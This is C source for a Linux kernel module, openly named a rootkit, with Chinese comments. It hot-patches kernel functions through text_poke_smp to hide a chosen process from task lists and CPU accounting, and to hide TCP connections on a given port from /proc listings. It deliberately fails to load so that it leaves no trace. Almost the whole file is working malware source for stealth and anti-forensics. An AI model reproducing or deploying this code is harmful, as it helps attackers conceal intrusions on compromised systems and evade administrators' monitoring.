// hide_process.c
#include <linux/module.h>
#include <net/tcp.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/sched.h>
#include <linux/nsproxy.h>
#include <linux/cpu.h>

char *stub = NULL;
char *addr_user = NULL;
char *addr_sys = NULL;
char *_tcp4_seq_show = NULL;
unsigned long *percpuoff = NULL;

static unsigned int pid = 0;
module_param(pid, int, 0444);

static unsigned int hide = 1;
module_param(hide, int, 0444);

static unsigned short port = 1234;
module_param(port, short, 0444);

// stub函数模版
void stub_func_account_time(struct task_struct *p, u64 cputime, u64 cputime_scaled)
{
	// 先用0x11223344来占位，模块加载的时候通过pid参数来校准
	if (p->pid == 0x11223344)  {
		asm ("pop %rbp; pop %r11; retq;");
	}
}

void stub_func_tcp_seq_show(struct seq_file *seq, void *v)
{
	// 过滤掉特定端口的TCP连接的显示
	if (v != SEQ_START_TOKEN && ((struct sock *)v)->sk_num == 1234)  {
		asm ("pop %rbp; pop %r11; xor %eax, %eax; retq;");
	}
}

#define FTRACE_SIZE   	5
#define POKE_OFFSET		0
#define POKE_LENGTH		5

#define RQUEUE_SIZE		2680
#define TASKS_OFFSET	2344
#define CPU_OFFSET		2336

void * *(*___vmalloc_node_range)(unsigned long size, unsigned long align,
            unsigned long start, unsigned long end, gfp_t gfp_mask,
            pgprot_t prot, int node, const void *caller);
static void *(*_text_poke_smp)(void *addr, const void *opcode, size_t len);
static struct mutex *_text_mutex;

// 需要额外分配的stub函数
char *hide_account_user_time = NULL;
char *hide_tcp4_seq_show = NULL;
unsigned char jmp_call[POKE_LENGTH];

#define START _AC(0xffffffffa0000000, UL)
#define END   _AC(0xffffffffff000000, UL)

void hide_net(struct task_struct *task)
{
	unsigned short *pport;
	char *tcp_stub;
	s32 offset;

	_tcp4_seq_show = (void *)kallsyms_lookup_name("tcp4_seq_show");
	if (!_tcp4_seq_show) {
		printk("_tcp4_seq_show not found\n");
		return;
	}
	hide_tcp4_seq_show = (void *)___vmalloc_node_range(128, 1, START, END,
								GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC,
								-1, __builtin_return_address(0));
	if (!hide_tcp4_seq_show) {
		printk("nomem\n");
		return;
	}

	memcpy(hide_tcp4_seq_show, stub_func_tcp_seq_show, 0x64);
	pport = (unsigned short *)&hide_tcp4_seq_show[19];
	*pport = port;

	tcp_stub = (void *)hide_tcp4_seq_show;

	jmp_call[0] = 0xe8;

	offset = (s32)((long)tcp_stub - (long)_tcp4_seq_show - FTRACE_SIZE);
	(*(s32 *)(&jmp_call[1])) = offset;

	get_online_cpus();
	mutex_lock(_text_mutex);
	_text_poke_smp(&_tcp4_seq_show[POKE_OFFSET], jmp_call, POKE_LENGTH);
	mutex_unlock(_text_mutex);
	put_online_cpus();

}

void restore_net(struct task_struct *task)
{
	s32 offset = *(unsigned int *)&_tcp4_seq_show[1];

	stub = (char *)(offset + (unsigned long)_tcp4_seq_show + FTRACE_SIZE);

	get_online_cpus();
	mutex_lock(_text_mutex);
	_text_poke_smp(&_tcp4_seq_show[POKE_OFFSET], &stub[0], POKE_LENGTH);
	mutex_unlock(_text_mutex);
	put_online_cpus();

	vfree(stub);
}

void hide_process(void)
{
	struct task_struct *task = NULL;
	struct pid_link *link = NULL;

	struct hlist_node *node = NULL;
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	link = &task->pids[PIDTYPE_PID];

	list_del_rcu(&task->tasks);
	INIT_LIST_HEAD(&task->tasks);
	node = &link->node;
	hlist_del_rcu(node);
	INIT_HLIST_NODE(node);
	node->pprev = &node;

	printk("task hide is:%p\n", task);

	hide_net(task);
}

#define CRQ_OFFSET	160
int reshow_process(void)
{
	struct list_head *list;
	struct task_struct *p, *n;
	unsigned long *rq_addr, base_rq;
	char *tmp;
	int cpu = smp_processor_id();
	struct task_struct *task = current;
	struct pid_link *link = NULL;

	// 根据current顺藤摸瓜找到本CPU的rq
	tmp = (char *)task->se.cfs_rq;;
	rq_addr = (unsigned long *)(tmp + CRQ_OFFSET);
	tmp = (char *)*rq_addr;

	// 根据本CPU的rq以及per cpu offset找到基准rq在percpu的偏移
	cpu = (int)*(int *)(tmp + CPU_OFFSET);
	base_rq = (unsigned long)tmp - (unsigned long)percpuoff[cpu];

	task = NULL;

	for_each_possible_cpu(cpu) {
		tmp = (char *)(percpuoff[cpu] + base_rq);
		list = (struct list_head *)&tmp[TASKS_OFFSET];
		list_for_each_entry_safe(p, n, list, se.group_node) {
			if (list_empty(&p->tasks)) {
				task = p;
				break;
			}
		}
		if (task) break;
	}

	// 进程可能sleep/wait在某个queue，请唤醒它重试
	if (!task) return 1;

	restore_net(task);

	link = &task->pids[PIDTYPE_PID];

	hlist_add_head_rcu(&link->node, &link->pid->tasks[PIDTYPE_PID]);
	list_add_tail_rcu(&task->tasks, &init_task.tasks);

	return 0;
}

static int __init rootkit_init(void)
{
	// 32位相对跳转偏移
	s32 offset;
	// 需要校准的pid指针位置。
	unsigned int *ppid;


	addr_user = (void *)kallsyms_lookup_name("account_user_time");
	addr_sys = (void *)kallsyms_lookup_name("account_system_time");
	if (!addr_user || !addr_sys) {
		printk("一切还没有准备好！请先加载sample模块。\n");
		return -1;
	}

	// 必须采用带range的内存分配函数，否则我们无法保证account_user_time可以32位相对跳转过来！
	___vmalloc_node_range = (void *)kallsyms_lookup_name("__vmalloc_node_range");
	_text_poke_smp = (void *)kallsyms_lookup_name("text_poke_smp");
	_text_mutex = (void *)kallsyms_lookup_name("text_mutex");
	if (!___vmalloc_node_range || !_text_poke_smp || !_text_mutex) {
		printk("还没开始，就已经结束。");
		return -1;
	}

	if (hide == 0) {
		offset = *(unsigned int *)&addr_user[1];
		stub = (char *)(offset + (unsigned long)addr_user + FTRACE_SIZE);

		percpuoff = (void *)kallsyms_lookup_name("__per_cpu_offset");
		if (!percpuoff)
			return -1;
		if (reshow_process())
			return -1;

		get_online_cpus();
		mutex_lock(_text_mutex);
		_text_poke_smp(&addr_user[POKE_OFFSET], &stub[0], POKE_LENGTH);
		_text_poke_smp(&addr_sys[POKE_OFFSET], &stub[0], POKE_LENGTH);
		mutex_unlock(_text_mutex);
		put_online_cpus();

		vfree(stub);

		return -1;
	}

	// 为了可以在32位范围内相对跳转，必须在START后分配stub func内存
	hide_account_user_time = (void *)___vmalloc_node_range(128, 1, START, END,
								GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC,
								-1, __builtin_return_address(0));
	if (!hide_account_user_time) {
		printk("很遗憾，内存不够了\n");
		return -1;
	}

	// 把模版函数拷贝到真正的stub函数中
	memcpy(hide_account_user_time, stub_func_account_time, 0x25);
	// 校准pid立即数
	ppid = (unsigned int *)&hide_account_user_time[12];
	// 使用立即数来比较pid，不然模块释放掉以后pid参数将不再可读
	*ppid = pid;

	stub = (void *)hide_account_user_time;

	jmp_call[0] = 0xe8;

	offset = (s32)((long)stub - (long)addr_user - FTRACE_SIZE);
	(*(s32 *)(&jmp_call[1])) = offset;

	get_online_cpus();
	mutex_lock(_text_mutex);
	_text_poke_smp(&addr_user[POKE_OFFSET], jmp_call, POKE_LENGTH);
	mutex_unlock(_text_mutex);
	put_online_cpus();

	offset = (s32)((long)stub - (long)addr_sys - FTRACE_SIZE);
	(*(s32 *)(&jmp_call[1])) = offset;

	get_online_cpus();
	mutex_lock(_text_mutex);
	_text_poke_smp(&addr_sys[POKE_OFFSET], jmp_call, POKE_LENGTH);
	mutex_unlock(_text_mutex);
	put_online_cpus();

	// 隐藏进程，将其从数据结构中摘除
	hide_process();

	// 事了拂衣去，不留痕迹
	return -1;
}

static void __exit rootkit_exit(void)
{
	// 事了拂衣去了，什么都没有留下，也不必再过问！
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
